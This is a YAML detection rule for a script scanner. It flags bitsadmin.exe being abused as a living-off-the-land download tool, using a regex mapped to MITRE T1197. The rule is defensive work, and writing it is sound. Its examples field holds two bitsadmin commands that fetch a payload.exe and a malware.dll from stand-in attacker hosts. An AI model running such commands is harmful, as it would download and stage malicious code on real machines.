# PowerShell Pattern: BITSAdmin LOLBin Abuse
# Detects bitsadmin usage for file downloads

id: PS-021
name: BITSAdmin LOLBin Abuse
description: |
  Detects abuse of bitsadmin.exe as a Living Off The Land Binary for downloading
  files from remote servers. Attackers use bitsadmin to download malicious payloads
  while evading detection, as it's a legitimate Windows utility.
languages:
  - powershell
detection_type: regex
detection_logic: '(?i)bitsadmin(?:\.exe)?\s+/transfer|bitsadmin(?:\.exe)?\s+/download'
severity: High
mitre_technique: T1197
confidence: 0.90
category: command_and_control
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-01-19"
  references:
    - "https://attack.mitre.org/techniques/T1197/"
    - "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
  tags:
    - lolbin
    - bitsadmin
    - download
    - file-transfer
  examples:
    - "bitsadmin /transfer myDownload /download /priority high http://evil.com/payload.exe C:\\temp\\payload.exe"
    - "bitsadmin.exe /transfer job http://attacker.com/malware.dll C:\\Windows\\Temp\\malware.dll"